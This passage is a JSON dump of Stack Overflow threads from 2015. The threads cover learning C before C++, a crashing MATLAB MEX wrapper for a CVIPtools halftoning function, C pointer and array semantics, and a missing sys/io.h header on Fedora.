"registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/mIepQ.png?s=128&g=1", "display_name": "PC Luddite", "link": "https://stackoverflow.com/users/4367864/pc-luddite"}, "edited": false, "score": 0, "creation_date": 1444860663, "post_id": 33136279, "comment_id": 54084487, "body": "C++ doesn&#39;t have any &quot;graphic&quot; capabilities in the standard library either."}, {"owner": {"reputation": 748, "user_id": 5381184, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/da66272a60130c5f545312f67e16d9a3?s=128&d=identicon&r=PG&f=1", "display_name": "BobRun", "link": "https://stackoverflow.com/users/5381184/bobrun"}, "edited": false, "score": 0, "creation_date": 1444866132, "post_id": 33136279, "comment_id": 54086385, "body": "You can do it in C and it is simpler, lots of good people give up on programming when they try to learn C++ . If you are having problems with C then C++ is not your solution."}], "answers": [{"tags": [], "owner": {"reputation": 989, "user_id": 1733383, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/51c4562803b7c0d405c57d309aa5252a?s=128&d=identicon&r=PG", "display_name": "BigTailWolf", "link": "https://stackoverflow.com/users/1733383/bigtailwolf"}, "is_accepted": false, "score": 2, "last_activity_date": 1444860390, "creation_date": 1444860390, "answer_id": 33136429, "question_id": 33136279, "link": "https://stackoverflow.com/questions/33136279/do-i-need-to-learn-c-before-learning-c/33136429#33136429", "title": "Do i need to learn c before learning c++?", "body": "<p>All the \"graphic\" things are supported by libraries, no matter in C(e.g. GTK, SDL) or C++ (e.g. QT).</p>\n\n<p>And for hardware drive programming, no matter what language it is. You have to compile it into binaries so that the hardware will knows how to run. You can even create your own language if you can write your own compiler.</p>\n"}], "owner": {"reputation": 5, "user_id": 5297689, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/d427fe752cfb616c010c9da70382736e?s=128&d=identicon&r=PG&f=1", "display_name": "Eduardo Serra", "link": "https://stackoverflow.com/users/5297689/eduardo-serra"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 390, "favorite_count": 0, "closed_date": 1444860572, "answer_count": 1, "score": -8, "last_activity_date": 1444860390, "creation_date": 1444859769, "question_id": 33136279, "link": "https://stackoverflow.com/questions/33136279/do-i-need-to-learn-c-before-learning-c", "closed_reason": "Opinion-based", "title": "Do i need to learn c before learning c++?", "body": "<p>I started to learn C, but I realized that all i could do was to build thse console programs (correct me if i'm wrong). So, i've seen that c++ is much more \"graphic\", like, you can build apps and windows, and is also OOP, what makes everything easier. So, do I need to finish learning c before c++?</p>\n\n<p>Also, what interested me about C was that I could program an Arduino. Can I program an Arduino with C++?</p>\n"}, {"tags": ["c++", "c", "matlab", "image-processing", "mex"], "answers": [{"tags": [], "owner": {"reputation": 36978, "user_id": 13313, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9a3d31b0487b4ae6de51cbbb23016440?s=128&d=identicon&r=PG", "display_name": "Dima", "link": "https://stackoverflow.com/users/13313/dima"}, "is_accepted": false, "score": 4, "last_activity_date": 1444860503, "creation_date": 1444860503, "answer_id": 33136454, "question_id": 33136224, "link": "https://stackoverflow.com/questions/33136224/matlab-crashes-while-executing-halftone-mex-wrapper-function/33136454#33136454", "title": "MATLAB crashes while executing halftone mex wrapper function?", "body": "<p>Sounds like a segmentation fault in your mex code. Check the input datatypes. Make sure that the data type of the parameters passed from matlab match those that are expected by the C function. Also, keep in mind that matlab arrays are column-major, and the sizes are [rows, cols], not [width height].</p>\n\n<p>If you can't spot the problem easily, then you would need to attach a debugger to the matlab process, or add a lot of <code>mexPrintf</code>'s into your code to see where exactly it fails.</p>\n"}], "owner": {"reputation": 167, "user_id": 5131819, "user_type": "registered", "accept_rate": 60, "profile_image": "https://lh6.googleusercontent.com/-f7KhjW0UfOk/AAAAAAAAAAI/AAAAAAAAAQM/w42vdA6nkdw/photo.jpg?sz=128", "display_name": "Deependra Mishra", "link": "https://stackoverflow.com/users/5131819/deependra-mishra"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 158, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1444860503, "creation_date": 1444859562, "question_id": 33136224, "link": "https://stackoverflow.com/questions/33136224/matlab-crashes-while-executing-halftone-mex-wrapper-function", "title": "MATLAB crashes while executing halftone mex wrapper function?", "body": "<p>Below screen shot is the result of the execution of the function in MATLAB.</p>\n\n<pre><code>a=imread('C:\\CVIPtools\\images\\car.bmp');\nad=im2double(a);\nht = halftoneCVIP(ad,4,255, 0.5, 0, 0);\n</code></pre>\n\n<p><a href=\"https://i.stack.imgur.com/vAy9g.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/vAy9g.png\" alt=\"enter image description here\"></a></p>\n\n<p>Halftoning: it's a methods for reducing the number of gray levels by creating dot patterns or dither patterns to represent various gray levels, reduces effective  spatial resolution also.</p>\n\n<p>There are 6 methods in halftoning.\n1. Floyd Stienberg\n2. Dither\n3. Threshold\n4. Cluster 3\n5. Cluster 4\n6. Cluster 8</p>\n\n<p><strong>*Image *CVIPhalftone(Image  <em>cvip_Image,  int  halftone,  int\n     maxval,   float   fthreshval,   CVIP_BOOLEAN   retain_image,\n     CVIP_BOOLEAN verbose)</em></strong></p>\n\n<pre><code>  &lt;cvip_Image&gt; - pointer to input image\n  &lt;halftone&gt; - indicates method used to convert  from  grays-\n cale  to  binary.  (one  of  QT_FS,  QT_THRESH,  QT_DITHER8,\n QT_CLUSTER3, QT_CLUSTER4, QT_CLUSTER8)\n  &lt;maxval&gt; - specifies maximum range of input image  (usually\n 255)\n  &lt;fthreshval&gt; - threshold value (for QT_THRESH) between [0.0\n ... 1.0].\n  &lt;retain_image&gt; - retain image after  writing  (CVIP_YES  or\n CVIP_NO)?\n  &lt;verbose&gt; - shall I be verbose (CVIP_YES or CVIP_NO)?**\n</code></pre>\n\n<p>I am trying to reuse a halftone function origianlly written in C. My objective is to make this function executable in MATLAB by writing a wrapper function using MEX.</p>\n\n<p>Below are the code I have written and I am able to compile successfully without any errors. However, while executing the function MATLAB crashes. Does anyone know the reason behind this?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n#include &lt;stdlib.h&gt;\n#include \"mex.h\"\n#include \"CVIPtools.h\"\n#include \"CVIPimage.h\"\n#include \"CVIPdef.h\"\n#include \"CVIPmap.h\"\n#include \"limits.h\"\n#include \"threshold.h\"\n#include &lt;float.h&gt;\n#include \"CVIPmatrix.h\"\n\n#include \"dithers.h\"\n#include \"CVIPhalftone.h\"\n\n#define CVIP_WHITE 1\n#define CVIP_BLACK 0\n\n#define FS_SCALE 1024\n#define HALF_FS_SCALE 512\n\n\nImage *CVIPhalftone(Image *cvip_Image, int halftone, int maxval, float fthreshval, CVIP_BOOLEAN retain_image, CVIP_BOOLEAN verbose)\n{\n    byte* grayrow;\n    register byte* gP;\n    byte* bitrow;\n    register byte* bP;\n    int rows, cols, row;\n    int col, limitcol, format;\n    char function_name[] = {\"CVIPhalftone\"};\n    long threshval, sum;\n    long* thiserr;\n    long* nexterr;\n    long* temperr;\n    int fs_direction;\n    Image *bit_Image;\n\n    cols = cvip_Image-&gt;image_ptr[0]-&gt;cols;\n    rows = cvip_Image-&gt;image_ptr[0]-&gt;rows;\n\n    bit_Image = (Image *) image_allocate(cvip_Image-&gt;image_format, BINARY, 1, rows, cols, CVIP_BYTE, REAL);\n\n    format = cvip_Image-&gt;image_format;\n    if( !(format==PBM || format==PGM || format==TIF || format==RAS || format==BIN || format==ITX) ) {\n       if(verbose)\n          fprintf(stderr, \"\\n%s: casting image to format that supports binary images - (PBM).\\n\",function_name);\n       bit_Image-&gt;image_format = PBM;\n    }\n    mexPrintf(\"Till here 1\\n\");\n    /* Initialize. */\n    switch ( halftone )\n    {\n    case QT_FS:         // QT_FS=1 defined in CVIPhalftone.h\n\n    if(verbose)\n       fprintf(stderr, \"%s: performing boustrophedonic Floyd-Steinberg error diffusion.\\n\\n\",function_name);\n    /* Initialize Floyd-Steinberg error vectors. */\n    thiserr = (long*) calloc( cols + 2, sizeof(long) );\n    nexterr = (long*) calloc( cols + 2, sizeof(long) );\n    srand( (int) ( time( 0 ) ^ getpid( ) ) );\n    for ( col = 0; col &lt; cols + 2; ++col )\n        thiserr[col] = ( rand( ) % FS_SCALE - HALF_FS_SCALE ) / 4;\n        /* (random errors in [-FS_SCALE/8 .. FS_SCALE/8]) */\n    fs_direction = 1;\n    threshval = fthreshval * FS_SCALE;\n    break;\n\n    case QT_THRESH:         // QT_THRESH=2 defined in CVIPhalftone.h\n\n    threshval = fthreshval * maxval + 0.999999;\n    if(verbose) {\n       fprintf(stderr, \"%s: performing simple thresholding operation.\\n\",function_name);\n       fprintf(stderr, \"%s: threshold level - %ld.\\n\\n\",function_name, threshval);\n    }\n    break;\n\n\n    case QT_DITHER8:        // QT_DITHER8=3 defined in CVIPhalftone.h\n    break;\n\n\n    case QT_CLUSTER3:       // QT_CLUSTER3=4 defined in CVIPhalftone.h\n    break;\n\n    case QT_CLUSTER4:       // QT_CLUSTER4=5 defined in CVIPhalftone.h\n\n    break;\n\n    case QT_CLUSTER8:       // QT_CLUSTER8=6 defined in CVIPhalftone.h\n\n    break;\n\n    default:\n    fprintf(stderr, \"%s: can't happen... but apparently something did?!?\\n\" , function_name); break;\n    }\n    mexPrintf(\"Till here 2\\n\");\n    for ( row = 0; row &lt; rows; ++row )\n    {\n    grayrow = (byte *) ((byte **) cvip_Image-&gt;image_ptr[0]-&gt;rptr)[row];\n    bitrow  = (byte *) ((byte **) bit_Image-&gt;image_ptr[0]-&gt;rptr)[row];\n\n    switch ( halftone )\n        {\n        case QT_FS:\n\n        for ( col = 0; col &lt; cols + 2; ++col )\n        nexterr[col] = 0;\n        if ( fs_direction )\n        {\n        col = 0;\n        limitcol = cols;\n        gP = grayrow;\n        bP = bitrow;\n        }\n        else\n        {\n        col = cols - 1;\n        limitcol = -1;\n        gP = &amp;(grayrow[col]);\n        bP = &amp;(bitrow[col]);\n        }\n        do\n        {\n        sum = ( (long) *gP * FS_SCALE ) / maxval + thiserr[col + 1];\n        if ( sum &gt;= threshval )\n            {\n            *bP = CVIP_WHITE;\n            sum = sum - threshval - HALF_FS_SCALE;\n            }\n        else\n            *bP = CVIP_BLACK;\n\n        if ( fs_direction )\n            {\n            thiserr[col + 2] += ( sum * 7 ) / 16;\n            nexterr[col    ] += ( sum * 3 ) / 16;\n            nexterr[col + 1] += ( sum * 5 ) / 16;\n            nexterr[col + 2] += ( sum     ) / 16;\n\n            ++col;\n            ++gP;\n            ++bP;\n            }\n        else\n            {\n            thiserr[col    ] += ( sum * 7 ) / 16;\n            nexterr[col + 2] += ( sum * 3 ) / 16;\n            nexterr[col + 1] += ( sum * 5 ) / 16;\n            nexterr[col    ] += ( sum     ) / 16;\n\n            --col;\n            --gP;\n            --bP;\n            }\n        }\n        while ( col != limitcol );\n        temperr = thiserr;\n        thiserr = nexterr;\n        nexterr = temperr;\n        fs_direction = ! fs_direction;\n        break;\n\n        case QT_THRESH:\n\n        for ( col = 0, gP = grayrow, bP = bitrow; col &lt; cols; ++col, ++gP, ++bP )\n        if ( *gP &gt;= threshval )\n            *bP = CVIP_WHITE;\n        else\n            *bP = CVIP_BLACK;\n        break;\n\n        case QT_DITHER8:\n\n        for ( col = 0, gP = grayrow, bP = bitrow; col &lt; cols; ++col, ++gP, ++bP )\n        if ( *gP &gt;= dither8[row % 16][col % 16] * ( maxval + 1 ) / 256 )\n            *bP = CVIP_WHITE;\n        else\n            *bP = CVIP_BLACK;\n        break;\n\n        case QT_CLUSTER3:\n\n        for ( col = 0, gP = grayrow, bP = bitrow; col &lt; cols; ++col, ++gP, ++bP )\n        if ( *gP &gt;= cluster3[row %6][col %6 ] * ( maxval + 1 ) / 18 )\n            *bP = CVIP_WHITE;\n        else\n            *bP = CVIP_BLACK;\n        break;\n\n        case QT_CLUSTER4:\n\n        for ( col = 0, gP = grayrow, bP = bitrow; col &lt; cols; ++col, ++gP, ++bP )\n        if ( *gP &gt;= cluster4[row %8][col%8] * ( maxval + 1 ) / 32 )\n            *bP = CVIP_WHITE;\n        else\n            *bP = CVIP_BLACK;\n        break;\n\n        case QT_CLUSTER8:\n\n        for ( col = 0, gP = grayrow, bP = bitrow; col &lt; cols; ++col, ++gP, ++bP )\n        if ( *gP &gt;= cluster8[row %16][col %16] * ( maxval + 1 ) / 128 )\n            *bP = CVIP_WHITE;\n        else\n            *bP = CVIP_BLACK;\n        break;\n\n        default:\n        fprintf(stderr, \"%s: can't happen... but apparently something did?!?\\n\" , function_name); break;\n        }\n    }\n    mexPrintf(\"Till here 1\\n\");\nif(!retain_image)\n   image_free(cvip_Image);\nreturn bit_Image;\nmexPrintf(\"Till here 2\\n\");\n}\n\n\n\nvoid midd( int choice, double *indata, double *outdata, int n, int row, int col, int bands)\n{\n    Image *inputImage;\n    byte        **image;    \n    unsigned int        r,  c;      \n    int i;\n    unsigned int    no_of_rows, \n            no_of_cols, \n            no_of_bands;    \n    COLOR_FORMAT color_space;\n    int check=0;\n     no_of_bands = bands;\n\n    no_of_rows =  row;\n\n    no_of_cols =  col;\n\n    for (i=0;i&lt;n;i++)\n    { if (check&lt;indata[i])\n          check=indata[i];\n    }\n\n\n    if (check&lt;=1){\n\n      for (i=0;i&lt;n;i++){\n      //outdata[i]=  floor(255*indata[i]);    //By Krishna Regmi\n      indata[i]=  floor(255*indata[i]);\n   }}\n    else\n    {for (i=0;i&lt;n;i++)\n      //outdata[i]=  floor(indata[i]);      //By Krishna Regmi\n      indata[i]=  floor(indata[i]);\n     }\n\n    // mexPrintf(\"\\ first value after scaling to 0-255 %f\\n\", outdata[0]);\n\n    // typedef enum {PBM, PGM, PPM, EPS, TIF, GIF, RAS, ITX, IRIS, CCC, BIN, VIP, GLR, BTC, BRC, HUF, ZVL, ARITH, BTC2, BTC3, DPC, ZON, ZON2, SAFVR, JPG, WVQ, FRA, VQ, XVQ} IMAGE_FORMAT;\n\n    //typedef enum {BINARY, GRAY_SCALE, RGB, HSL, HSV, SCT, CCT, LUV, LAB, XYZ}\n\n    inputImage=new_Image (BMP, RGB, no_of_bands, row,  col, CVIP_BYTE, REAL ); \n\n    for(bands=0; bands &lt; no_of_bands; bands++) {\n    image = getData_Image(inputImage, bands);\n    for(r=0; r &lt; no_of_rows; r++) {\n            for(c=0; c &lt; no_of_cols; c++)\n            {\n                image[r][c]=outdata[r+row*c+row*col*bands];        /* passing data from MATLAB variable to CVIPtools variable   */\n             }\n         }\n    }\n\n\n    //Image *CVIPhalftone(Image *cvip_Image, int halftone, int maxval, float fthreshval, CVIP_BOOLEAN retain_image, CVIP_BOOLEAN verbose)\n\n   //inputImage= CVIPhalftone(cvipImage,QT_THRESH,255,0.5,CVIP_NO,CVIP_NO);\n\n    inputImage  =   CVIPhalftone(inputImage, choice, 255, 0.5, CVIP_NO, CVIP_NO);\n\n for(bands=0; bands &lt; no_of_bands; bands++) {\n        image = getData_Image(inputImage, bands);\n    for(r=0; r &lt; no_of_rows; r++) {\n            for(c=0; c &lt; no_of_cols; c++)\n            {\n                outdata[r+row*c+row*col*bands] = floor(image[r][c]);     /* passing data back to MATLAB variable from CVIPtools variable */\n\n            }\n         }\n      }\n\n    }       /* end of wrapper function*/\n\n\n/* main gateway function*/\n\nvoid mexFunction(int nlhs, mxArray *plhs[], int nrhs, const mxArray *prhs[])\n{\n    double *outdata, *indata;\n    int    r,c,bands;\n    const mwSize *dim_array;\n    int choice,n;\n    //char color_type;\n    // COLOR_FORMAT color_space;\n    //int choice;\n    //int n = mxGetNumberOfElements(prhs[0]);\n    n = mxGetNumberOfElements(prhs[0]);\n    indata = mxGetData(prhs[0]);\n    //double *indata = (double *)mxGetData(prhs[0]);\n    dim_array = mxGetDimensions(prhs[0]);\n    //color_type = mxGetChars(prhs[1]);\n\n    choice = mxGetScalar(prhs[1]);\n    r         = dim_array[0];\n     c         = dim_array[1];\n      bands         = dim_array[2];\n\n      // mexPrintf(\"total elements %d\\n\", n);\n\n    if(bands==3){\n\n        plhs[0] = mxCreateNumericArray(3, dim_array, mxDOUBLE_CLASS, mxREAL);\n\n    }\n    else\n    { plhs[0] = mxCreateDoubleMatrix(r,c,mxREAL);\n      bands=1;\n       }\n      outdata = mxGetData(plhs[0]);\n    midd(choice, indata, outdata, n, r, c, bands);\n }\n</code></pre>\n"}, {"tags": ["c", "pointers", "char", "int"], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user5368953"}, "edited": false, "score": 0, "creation_date": 1444859830, "post_id": 33136278, "comment_id": 54084150, "body": "But when you say *c...it is an array. So does it always point to the first index?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user5368953"}, "edited": false, "score": 0, "creation_date": 1444860006, "post_id": 33136278, "comment_id": 54084231, "body": "So *c means the pointer to the memory location of the first index of the array?"}, {"owner": {"reputation": 37741, "user_id": 3425536, "user_type": "registered", "accept_rate": 72, "profile_image": "https://graph.facebook.com/1484495923/picture?type=large", "display_name": "emlai", "link": "https://stackoverflow.com/users/3425536/emlai"}, "edited": false, "score": 0, "creation_date": 1444860114, "post_id": 33136278, "comment_id": 54084271, "body": "An array is an array, not a pointer. An array doesn&#39;t point anywhere. But an array can decay to a pointer to the first element in the array, as happens when the <code>*</code> dereference operator is applied to the array name. Thus <code>*c</code> evaluates to the first element of the array, and is identical to writing <code>c[0]</code>."}, {"owner": {"user_type": "does_not_exist", "display_name": "user5368953"}, "edited": false, "score": 0, "creation_date": 1444860167, "post_id": 33136278, "comment_id": 54084288, "body": "*c = c [0] is what you are saying"}, {"owner": {"reputation": 1031, "user_id": 3933895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c3eff8d3f5166ea0f7974afbfcdd5ca?s=128&d=identicon&r=PG&f=1", "display_name": "Samidamaru", "link": "https://stackoverflow.com/users/3933895/samidamaru"}, "edited": false, "score": 0, "creation_date": 1444860226, "post_id": 33136278, "comment_id": 54084315, "body": "Yes, when you define an array, the array name is a pointer to the array&#39;s first element, so in your specific example for instance, nums is a pointer to num[0]. That is to say *nums = nums[0]."}, {"owner": {"reputation": 37741, "user_id": 3425536, "user_type": "registered", "accept_rate": 72, "profile_image": "https://graph.facebook.com/1484495923/picture?type=large", "display_name": "emlai", "link": "https://stackoverflow.com/users/3425536/emlai"}, "reply_to_user": {"reputation": 1031, "user_id": 3933895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c3eff8d3f5166ea0f7974afbfcdd5ca?s=128&d=identicon&r=PG&f=1", "display_name": "Samidamaru", "link": "https://stackoverflow.com/users/3933895/samidamaru"}, "edited": false, "score": 0, "creation_date": 1444860292, "post_id": 33136278, "comment_id": 54084343, "body": "@MPI_What No, the array name is not a pointer. The array name is a name for the array, and the array itself is an array, not a pointer."}, {"owner": {"reputation": 1031, "user_id": 3933895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c3eff8d3f5166ea0f7974afbfcdd5ca?s=128&d=identicon&r=PG&f=1", "display_name": "Samidamaru", "link": "https://stackoverflow.com/users/3933895/samidamaru"}, "edited": false, "score": 0, "creation_date": 1444860338, "post_id": 33136278, "comment_id": 54084359, "body": "An array name is essentially a constant pointer to the first element of the array..."}, {"owner": {"reputation": 37741, "user_id": 3425536, "user_type": "registered", "accept_rate": 72, "profile_image": "https://graph.facebook.com/1484495923/picture?type=large", "display_name": "emlai", "link": "https://stackoverflow.com/users/3425536/emlai"}, "reply_to_user": {"reputation": 1031, "user_id": 3933895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c3eff8d3f5166ea0f7974afbfcdd5ca?s=128&d=identicon&r=PG&f=1", "display_name": "Samidamaru", "link": "https://stackoverflow.com/users/3933895/samidamaru"}, "edited": false, "score": 0, "creation_date": 1444860471, "post_id": 33136278, "comment_id": 54084407, "body": "@MPI_What Time to learn the basics. An array name can <b>decay</b> to a pointer-to-the-first-element when it is handled like a pointer (e.g. dereferenced), but it <b>is</b> not a pointer. See <a href=\"http://stackoverflow.com/q/1641957/3425536\">Is array name a pointer in C?</a>."}, {"owner": {"reputation": 1031, "user_id": 3933895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c3eff8d3f5166ea0f7974afbfcdd5ca?s=128&d=identicon&r=PG&f=1", "display_name": "Samidamaru", "link": "https://stackoverflow.com/users/3933895/samidamaru"}, "edited": false, "score": 0, "creation_date": 1444860577, "post_id": 33136278, "comment_id": 54084453, "body": "Very well, I accept. My point was more that they can be treated as the same thing though. I&#39;ll butt out now ..."}, {"owner": {"reputation": 37741, "user_id": 3425536, "user_type": "registered", "accept_rate": 72, "profile_image": "https://graph.facebook.com/1484495923/picture?type=large", "display_name": "emlai", "link": "https://stackoverflow.com/users/3425536/emlai"}, "edited": false, "score": 0, "creation_date": 1444860623, "post_id": 33136278, "comment_id": 54084479, "body": "Sometimes yes, sometimes no."}], "tags": [], "owner": {"reputation": 37741, "user_id": 3425536, "user_type": "registered", "accept_rate": 72, "profile_image": "https://graph.facebook.com/1484495923/picture?type=large", "display_name": "emlai", "link": "https://stackoverflow.com/users/3425536/emlai"}, "is_accepted": false, "score": 0, "last_activity_date": 1444860224, "last_edit_date": 1495542184, "creation_date": 1444859769, "answer_id": 33136278, "question_id": 33136202, "link": "https://stackoverflow.com/questions/33136202/about-pointers-and-arrays-and-types-and-casting/33136278#33136278", "title": "About Pointers and arrays and types and casting", "body": "<p><code>*c</code> \u2192 <a href=\"https://stackoverflow.com/q/1461432/3425536\">Decay <code>c</code> to pointer-to-first-element</a>, and access the pointed-to value. Same as <code>c[0]</code>.<br>\n<code>(int) *c</code> \u2192  cast that value to <code>int</code>.<br>\n<code>*p = (int) *c</code> \u2192  assign that to what <code>p</code> points to. </p>\n"}, {"tags": [], "owner": {"reputation": 234, "user_id": 2423201, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cdafd787c747ebf09f403652146be346?s=128&d=identicon&r=PG", "display_name": "Peter Merkert", "link": "https://stackoverflow.com/users/2423201/peter-merkert"}, "is_accepted": false, "score": 1, "last_activity_date": 1444860369, "creation_date": 1444860369, "answer_id": 33136424, "question_id": 33136202, "link": "https://stackoverflow.com/questions/33136202/about-pointers-and-arrays-and-types-and-casting/33136424#33136424", "title": "About Pointers and arrays and types and casting", "body": "<p>Let's break it down: <code>*p = (int) *c;</code></p>\n\n<p><code>c</code> is a char array.</p>\n\n<p><code>*c</code> is the first element of the char array, because <code>c[0]</code> = <code>*(c+0)</code> = <code>*(c)</code> = <code>*c</code></p>\n\n<p><code>(int) *c</code> casts the first element of the char array <code>c</code> to an integer. This is required, because with...</p>\n\n<p><code>*p = (int) *c</code> you assign the to an integer casted char to the content of pointer <code>p</code>.</p>\n"}, {"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user5368953"}, "edited": false, "score": 0, "creation_date": 1444861809, "post_id": 33136463, "comment_id": 54084940, "body": "I meant set p = &amp;nums[2]"}], "tags": [], "owner": {"reputation": 2385, "user_id": 1009270, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/33fcdc9c0604cf69abb15e17840d2a3c?s=128&d=identicon&r=PG", "display_name": "john elemans", "link": "https://stackoverflow.com/users/1009270/john-elemans"}, "is_accepted": false, "score": 1, "last_activity_date": 1444860571, "creation_date": 1444860571, "answer_id": 33136463, "question_id": 33136202, "link": "https://stackoverflow.com/questions/33136202/about-pointers-and-arrays-and-types-and-casting/33136463#33136463", "title": "About Pointers and arrays and types and casting", "body": "<p>This code will not work, or will cause problems if it does.</p>\n\n<p>the line;\n    p = nums[2];</p>\n\n<p>sets the value of the pointer p to the value 9. This is not likely a legal value for your pointer. If it were, then the memory location 9 would be set to 115 which is the integer value of 's'.</p>\n"}, {"tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": false, "score": 0, "last_activity_date": 1451036739, "creation_date": 1451036739, "answer_id": 34461787, "question_id": 33136202, "link": "https://stackoverflow.com/questions/33136202/about-pointers-and-arrays-and-types-and-casting/34461787#34461787", "title": "About Pointers and arrays and types and casting", "body": "<p>There are many issues in this code, let's address them first.</p>\n\n<ul>\n<li><p>Firstly, <code>main(void)</code> is not conforming code. You need to change that to <code>int main(void).</code> </p></li>\n<li><p>Secondly, <code>p =  nums [2];</code> is wrong. <code>p</code> is of type <code>int *</code>, and <code>nums[2]</code> is of type <code>int</code>. You may not assign an <code>int</code> to a <code>int *</code> and expect something fruitful to happen. Maybe what you meant to write is <code>p =  &amp;nums[2];</code>. Without this modification, going further will invoke <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow\">undefined behavior</a> as you will try to access a memory location that is <em>invalid</em> to your program.</p></li>\n</ul>\n\n<p>Then, coming to your question, </p>\n\n<pre><code>*p = (int) *c;\n</code></pre>\n\n<p>it basically dereference <code>c</code><sup>NOTE</sup> to get the value, then cast it to an <code>int</code> type and store into the memory location pointed by <code>p</code>. However, in <code>C</code>, this casting is not required. The above statement is equivalent to </p>\n\n<pre><code>*p = *c;\n</code></pre>\n\n<p>anyway.</p>\n\n<hr>\n\n<p>NOTE: Array name decays to the pointer to the first element of the array, i.e., in this code, using <code>c</code> is the same as <code>&amp;c[0]</code>, roughly.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user5368953"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 34, "favorite_count": 0, "answer_count": 4, "score": 0, "last_activity_date": 1451036867, "creation_date": 1444859461, "last_edit_date": 1451036867, "question_id": 33136202, "link": "https://stackoverflow.com/questions/33136202/about-pointers-and-arrays-and-types-and-casting", "title": "About Pointers and arrays and types and casting", "body": "<p>Say I have the following problem: </p>\n\n<pre><code>main(void) {\nint * p;\nint nums [3] = {1,5,9};\nchar c [3] = {'s','t','u'};\np =  nums [2];\n*p = (int) *c;\n}\n</code></pre>\n\n<p>What does the last line mean?</p>\n"}, {"tags": ["c", "linux", "posix"], "comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 2, "creation_date": 1444857227, "post_id": 33135596, "comment_id": 54082967, "body": "What is <code>&lt;sys&#47;io.h&gt;</code> and why are you including it?"}, {"owner": {"reputation": 28836, "user_id": 4581301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e5580eebb22e2c65c9b2325d2276d92a?s=128&d=identicon&r=PG&f=1", "display_name": "user4581301", "link": "https://stackoverflow.com/users/4581301/user4581301"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 2, "creation_date": 1444857677, "post_id": 33135596, "comment_id": 54083152, "body": "@melpomene It&#39;s a either a header for a posix library or a very widely supported unix one. Not entirely certain which. William, welcome to Mac-land, from the looks of it. They are a bit weird over there. Anyway, this is almost a dupe of: <a href=\"http://stackoverflow.com/questions/2762010/osx-sys-io-h-not-found\" title=\"osx sys io h not found\">stackoverflow.com/questions/2762010/osx-sys-io-h-not-found</a>"}, {"owner": {"reputation": 4731, "user_id": 1467926, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/e0148d321d2f35a32f9c93d1d5dac478?s=128&d=identicon&r=PG&f=1", "display_name": "Fermat&#39;s Little Student", "link": "https://stackoverflow.com/users/1467926/fermats-little-student"}, "reply_to_user": {"reputation": 28836, "user_id": 4581301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e5580eebb22e2c65c9b2325d2276d92a?s=128&d=identicon&r=PG&f=1", "display_name": "user4581301", "link": "https://stackoverflow.com/users/4581301/user4581301"}, "edited": false, "score": 0, "creation_date": 1444859459, "post_id": 33135596, "comment_id": 54083976, "body": "@user4581301 Before posting this question, I have already read that one. Unfortunately it didnt help me because I am encountering this issue in fedora, not OS X."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1444859579, "post_id": 33135596, "comment_id": 54084040, "body": "<code>&lt;sys&#47;uio.h&gt;</code> is from POSIX: <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/sys_uio.h.html\" rel=\"nofollow noreferrer\">pubs.opengroup.org/onlinepubs/9699919799/basedefs/&hellip;</a>"}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 1, "creation_date": 1444859921, "post_id": 33135596, "comment_id": 54084192, "body": "Doesn&#39;t your code even compile when simply commenting out <code>#include &lt;sys&#47;io.h&gt;</code>?"}, {"owner": {"reputation": 4731, "user_id": 1467926, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/e0148d321d2f35a32f9c93d1d5dac478?s=128&d=identicon&r=PG&f=1", "display_name": 